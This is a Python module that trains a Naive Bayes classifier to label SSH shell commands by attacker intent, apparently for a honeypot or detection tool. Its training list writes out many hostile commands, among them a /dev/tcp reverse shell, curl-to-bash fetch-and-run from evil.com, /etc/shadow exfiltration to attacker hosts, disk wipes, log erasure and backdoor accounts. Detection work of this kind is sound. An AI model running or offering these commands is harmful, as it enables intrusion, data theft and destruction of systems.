"""
ML SSH Command Intent Classifier
----------------------------------
Classifies SSH shell commands (or command sequences) into attacker intent
categories using Multinomial Naive Bayes + Bag-of-Words on tokens.

Intent categories:
    Recon          — whoami, id, uname, ifconfig, netstat, cat /etc/passwd
    Persistence    — crontab, .bashrc, .ssh/authorized_keys, systemd
    Exfiltration   — wget, curl, scp, nc, ftp, rsync to remote
    Destructive    — rm -rf, shred, dd, mkfs, kill
    Malware        — chmod +x, ./malware, python -c, base64 decode
    Normal         — echo, pwd, ls, cd, exit

Usage:
    from ml_command_intent import CommandIntentClassifier
    clf = CommandIntentClassifier()
    intent, confidence = clf.predict("wget http://evil.com/shell.sh; chmod +x shell.sh")
"""

from __future__ import annotations

import logging
import math
import os
import re

logger = logging.getLogger(__name__)

_DIR = os.path.dirname(os.path.abspath(__file__))
MODEL_PATH = os.path.join(_DIR, "ml_models", "command_intent.pkl")
VECTORIZER_PATH = os.path.join(_DIR, "ml_models", "command_intent_vec.pkl")

# ── training data ──────────────────────────────────────────────────────────────
_TRAINING_DATA: list[tuple[str, str]] = [
    # ---------- Recon ----------
    ("whoami", "Recon"),
    ("id", "Recon"),
    ("uname -a", "Recon"),
    ("uname -r", "Recon"),
    ("cat /etc/passwd", "Recon"),
    ("cat /etc/shadow", "Recon"),
    ("cat /etc/hostname", "Recon"),
    ("ifconfig", "Recon"),
    ("ip addr", "Recon"),
    ("ip route", "Recon"),
    ("netstat -an", "Recon"),
    ("netstat -tulnp", "Recon"),
    ("ss -tulnp", "Recon"),
    ("ps aux", "Recon"),
    ("ps -ef", "Recon"),
    ("ls /home", "Recon"),
    ("ls /var/www", "Recon"),
    ("ls -la /root", "Recon"),
    ("cat /proc/version", "Recon"),
    ("env", "Recon"),
    ("printenv", "Recon"),
    ("hostname", "Recon"),
    ("cat /etc/os-release", "Recon"),
    ("lscpu", "Recon"),
    ("free -m", "Recon"),
    ("df -h", "Recon"),
    ("find / -perm -4000 2>/dev/null", "Recon"),   # SUID search
    ("find / -name '*.conf' 2>/dev/null", "Recon"),
    ("cat /etc/crontab", "Recon"),
    # ---------- Persistence ----------
    ("crontab -e", "Persistence"),
    ("echo '* * * * * /tmp/shell.sh' >> /etc/crontab", "Persistence"),
    ("echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", "Persistence"),
    ("mkdir -p ~/.ssh && echo 'pubkey' > ~/.ssh/authorized_keys", "Persistence"),
    ("echo '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc", "Persistence"),
    ("systemctl enable malicious.service", "Persistence"),
    ("cp /bin/bash /tmp/.hidden && chmod +s /tmp/.hidden", "Persistence"),
    ("echo 'backdoor' >> /etc/rc.local", "Persistence"),
    ("ln -s /bin/bash /usr/local/bin/sysupdate", "Persistence"),
    ("useradd -m -s /bin/bash hacker", "Persistence"),
    ("passwd hacker", "Persistence"),
    ("usermod -aG sudo hacker", "Persistence"),
    # ---------- Exfiltration ----------
    ("wget http://attacker.com/data.tar.gz", "Exfiltration"),
    ("curl -O http://evil.com/shell", "Exfiltration"),
    ("scp /etc/passwd attacker@10.0.0.1:/tmp/", "Exfiltration"),
    ("rsync -avz /home/ attacker@evil.com:/dump/", "Exfiltration"),
    ("nc -w 3 attacker.com 4444 < /etc/passwd", "Exfiltration"),
    ("ftp -n attacker.com <<EOF", "Exfiltration"),
    ("tar czf - /home | nc attacker.com 9999", "Exfiltration"),
    ("cat /etc/shadow | base64 | curl -d @- http://evil.com/collect", "Exfiltration"),
    ("python3 -c \"import socket,subprocess; ...\"", "Exfiltration"),
    ("dd if=/dev/sda | nc attacker.com 4444", "Exfiltration"),
    # ---------- Destructive ----------
    ("rm -rf /", "Destructive"),
    ("rm -rf /var/log/*", "Destructive"),
    ("rm -rf /home/*", "Destructive"),
    ("shred -zuf /etc/passwd", "Destructive"),
    ("dd if=/dev/zero of=/dev/sda bs=512", "Destructive"),
    ("mkfs.ext4 /dev/sda", "Destructive"),
    ("kill -9 -1", "Destructive"),
    ("> /var/log/auth.log", "Destructive"),
    ("truncate -s 0 /var/log/syslog", "Destructive"),
    ("history -c && rm ~/.bash_history", "Destructive"),
    ("find /var/log -type f -delete", "Destructive"),
    # ---------- Malware ----------
    ("wget http://evil.com/malware.sh && chmod +x malware.sh && ./malware.sh", "Malware"),
    ("curl -s http://evil.com/implant | bash", "Malware"),
    ("python3 -c 'import base64; exec(base64.b64decode(\"AAAA\"))'", "Malware"),
    ("echo 'YmFzaAo=' | base64 -d | bash", "Malware"),
    ("chmod +x /tmp/.x && /tmp/.x", "Malware"),
    ("./exploit", "Malware"),
    ("./shell.elf", "Malware"),
    ("/tmp/backdoor &", "Malware"),
    ("nohup /tmp/miner > /dev/null 2>&1 &", "Malware"),
    ("screen -dmS miner /tmp/xmrig --pool ...", "Malware"),
    ("install cryptominer", "Malware"),
    # ---------- Normal ----------
    ("ls", "Normal"),
    ("ls -la", "Normal"),
    ("pwd", "Normal"),
    ("cd /tmp", "Normal"),
    ("echo hello", "Normal"),
    ("exit", "Normal"),
    ("logout", "Normal"),
    ("clear", "Normal"),
    ("date", "Normal"),
    ("uptime", "Normal"),
    ("man ls", "Normal"),
    ("help", "Normal"),
    ("cd ..", "Normal"),
    ("touch test.txt", "Normal"),
    ("mkdir testdir", "Normal"),
]


def _tokenize(command: str) -> str:
    """Normalize a command string for vectorization."""
    # Lowercase, keep only ASCII printable
    cmd = command.lower()
    # Collapse whitespace
    cmd = re.sub(r"\s+", " ", cmd).strip()
    return cmd


class CommandIntentClassifier:
    """Naive Bayes–based SSH command intent classifier."""

    def __init__(self) -> None:
        self._model = None
        self._vectorizer = None
        self._ready = False
        os.makedirs(os.path.join(_DIR, "ml_models"), exist_ok=True)
        self._load()

    # ── public API ─────────────────────────────────────────────────────────────

    def predict(self, command: str) -> tuple[str | None, float]:
        """
        Classify a single command or semicolon-joined command sequence.
        Returns (intent_label, confidence) or (None, 0.0) for Normal.
        """
        if not self._ready:
            return self._heuristic(command), 0.0
        try:
            normalized = _tokenize(command)
            X = self._vectorizer.transform([normalized])
            proba = self._model.predict_proba(X)[0]
            classes = list(self._model.classes_)
            best_idx = int(proba.argmax())
            label = str(classes[best_idx])
            confidence = self._calibrate_confidence(proba, normalized)
            if label == "Normal":
                return None, confidence
            return label, confidence
        except Exception as exc:
            logger.error("CommandIntentClassifier predict error: %s", exc)
            return self._heuristic(command), 0.0

    def predict_session(self, commands: list[str]) -> tuple[str | None, float]:
        """
        Classify a full session (list of commands joined together).
        Returns the highest-threat intent found, or None if Normal.
        """
        if not commands:
            return None, 0.0

        # Predict each command; return highest-threat result
        priority = ["Destructive", "Malware", "Exfiltration", "Persistence", "Recon", "Normal"]
        best_label: str | None = None
        best_conf = 0.0

        for cmd in commands:
            label, conf = self.predict(cmd)
            if label is None:
                label = "Normal"
            if priority.index(label) < priority.index(best_label or "Normal"):
                best_label = label
                best_conf = conf
            elif label == best_label and conf > best_conf:
                best_conf = conf

        if best_label == "Normal":
            return None, best_conf
        return best_label, best_conf

    def train(self) -> bool:
        """Train model on built-in data and save to disk."""
        try:
            from sklearn.naive_bayes import MultinomialNB
            from sklearn.feature_extraction.text import TfidfVectorizer
            import joblib

            texts = [_tokenize(d[0]) for d in _TRAINING_DATA]
            labels = [d[1] for d in _TRAINING_DATA]

            vec = TfidfVectorizer(
                analyzer="word",
                ngram_range=(1, 2),
                max_features=2000,
                sublinear_tf=True,
            )
            X = vec.fit_transform(texts)

            clf = MultinomialNB(alpha=0.5)
            clf.fit(X, labels)

            joblib.dump(clf, MODEL_PATH)
            joblib.dump(vec, VECTORIZER_PATH)
            self._model = clf
            self._vectorizer = vec
            self._ready = True
            logger.info("CommandIntentClassifier: trained and saved")
            return True
        except ImportError:
            logger.warning("CommandIntentClassifier: scikit-learn not installed")
            return False
        except Exception as exc:
            logger.error("CommandIntentClassifier training failed: %s", exc)
            return False

    @property
    def is_ready(self) -> bool:
        return self._ready

    # ── private ────────────────────────────────────────────────────────────────

    _HEURISTIC_MAP = {
        "Recon": ["whoami", "id", "uname", "ifconfig", "netstat", "ps aux",
                  "/etc/passwd", "/etc/shadow", "hostname"],
        "Persistence": ["crontab", "authorized_keys", ".bashrc", "rc.local",
                        "useradd", "usermod"],
        "Exfiltration": ["wget", "curl", "scp", "rsync", "nc ", "ftp "],
        "Destructive": ["rm -rf", "shred", "mkfs", "dd if=", "kill -9",
                        "/dev/null"],
        "Malware": ["chmod +x", "./", "base64", "nohup", "xmrig", "miner"],
    }

    def _heuristic(self, command: str) -> str | None:
        cmd_lower = command.lower()
        for intent, keywords in self._HEURISTIC_MAP.items():
            if any(kw in cmd_lower for kw in keywords):
                return intent
        return None

    def _load(self) -> None:
        if os.path.exists(MODEL_PATH) and os.path.exists(VECTORIZER_PATH):
            try:
                import joblib
                self._model = joblib.load(MODEL_PATH)
                self._vectorizer = joblib.load(VECTORIZER_PATH)
                self._ready = True
                logger.info("CommandIntentClassifier: loaded from disk")
                return
            except Exception as exc:
                logger.warning("CommandIntentClassifier: could not load (%s)", exc)
        self.train()

    @staticmethod
    def _calibrate_confidence(proba: list[float], normalized_command: str) -> float:
        """Calibrate Naive Bayes confidence for better real-world reliability."""
        probs = [float(p) for p in proba]
        if not probs:
            return 0.0

        probs_sorted = sorted(probs, reverse=True)
        top1 = probs_sorted[0]
        top2 = probs_sorted[1] if len(probs_sorted) > 1 else 0.0
        margin = max(0.0, min(1.0, top1 - top2))

        eps = 1e-12
        entropy = -sum(p * math.log(max(p, eps)) for p in probs)
        max_entropy = math.log(max(len(probs), 2))
        entropy_norm = entropy / max_entropy if max_entropy > 0 else 0.0

        token_count = len(normalized_command.split())
        token_factor = max(0.6, min(1.0, token_count / 6.0))

        calibrated = top1 * (0.6 + 0.4 * margin) * (1.0 - 0.3 * entropy_norm) * token_factor
        return max(0.0, min(1.0, calibrated))
